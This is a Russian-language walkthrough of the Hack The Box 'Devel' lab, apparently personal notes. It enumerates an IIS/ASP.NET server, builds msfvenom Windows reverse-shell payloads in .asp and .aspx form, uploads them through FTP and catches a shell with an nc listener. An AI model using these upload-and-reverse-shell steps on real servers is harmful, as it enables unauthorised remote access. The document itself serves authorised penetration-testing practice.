# Website

При посещении `http://10.10.10.5` видим страницу приветствия:

![[Pasted image 20210614115346.png]]

Просмотр исходного кода показывает, что изображение `welcome.png` находится на том же уровне, что и корневая директория сайта:

![[Pasted image 20210614115441.png]]

Перейдя на `/test`, мы не видим папку, которую мы загрузили:

![[Pasted image 20210614115505.png]]

А что, если добавить файл HTML? Или ASP? Прежде чем попробовать, стоит посмотреть, что он выполняет:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/devel]
└─$ curl -v http://10.10.10.5
*   Trying 10.10.10.5:80...
* Connected to 10.10.10.5 (10.10.10.5) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.10.10.5
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Content-Type: text/html
< Last-Modified: Fri, 17 Mar 2017 14:37:30 GMT
< Accept-Ranges: bytes
< ETag: "37b5ed12c9fd21:0"
< Server: Microsoft-IIS/7.5
< X-Powered-By: ASP.NET
< Date: Mon, 14 Jun 2021 11:05:36 GMT
< Content-Length: 689
< 
```

`curl` определил, что это ASP.NET, как и ожидалось от сервера IIS. Мы можем проверить это — `index.html` не загружается:

![[Pasted image 20210614115751.png]]

Затем `index.asp` тоже не загружается:

![[Pasted image 20210614120008.png]]

Или `index.aspx`:

![[Pasted image 20210614120025.png]]

Почему бы просто не попробовать загрузить шелл и посмотреть, что произойдёт? Мы можем создать `.asp` обратный шелл:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/devel]
└─$ msfvenom -p windows/shell_reverse_tcp lhost=tun0 lport=413 -f asp -o whoops.asp
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of asp file: 38610 bytes
Saved as: whoops.asp
```

И попробуем загрузить его:

```bash
ftp> put whoops.asp 
local: whoops.asp remote: whoops.asp
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
38680 bytes sent in 0.00 secs (32.9947 MB/s)
```

Отлично. Теперь запустим слушатель. Я использую порт 413, так как Windows Defender может блокировать более высокие порты, поэтому мне нужны права root для прослушивания:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/devel]
└─$ sudo nc -lnvp 413
[sudo] password for mac: 
listening on [any] 413 ...
```

Теперь посетим шелл:

![[Pasted image 20210614120438.png]]

Мы получаем ошибку 500 и никакого шелла. Но 500 вместо 404 указывает на то, что мы, вероятно, находимся в правильном месте для вызова обработки, а шелл просто не работает. А как насчёт `.aspx` пада:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/devel]
└─$ msfvenom -p windows/shell_reverse_tcp lhost=tun0 lport=413 -f aspx -o whoopsie.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2728 bytes
Saved as: whoopsie.aspx
```

В FTP:

```bash
ftp> put whoopsie.aspx 
local: whoopsie.aspx remote: whoopsie.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2763 bytes sent in 0.00 secs (16.1657 MB/s)
```

На этот раз страница загрузилась:

![[Pasted image 20210614120758.png]]

И мы получили шелл!

![[Pasted image 20210614120816.png]]

Запуск шелла на системе занял около 20 минут. Мы становимся быстрее!
